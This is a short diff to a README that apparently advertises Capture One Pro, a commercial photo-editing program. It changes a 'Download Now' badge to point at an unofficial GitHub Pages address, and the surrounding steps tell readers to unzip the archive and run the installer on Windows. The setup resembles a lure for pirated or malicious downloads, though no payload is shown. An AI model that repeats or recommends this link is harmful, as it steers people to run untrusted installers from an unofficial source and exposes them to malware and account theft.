@@ -8,7 +8,7 @@ It supports **hundreds of cameras**, delivers **powerful tethered capture**, and
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-orange?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-orange?style=for-the-badge)](https://capture-one-pro-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer on your Windows PC.  
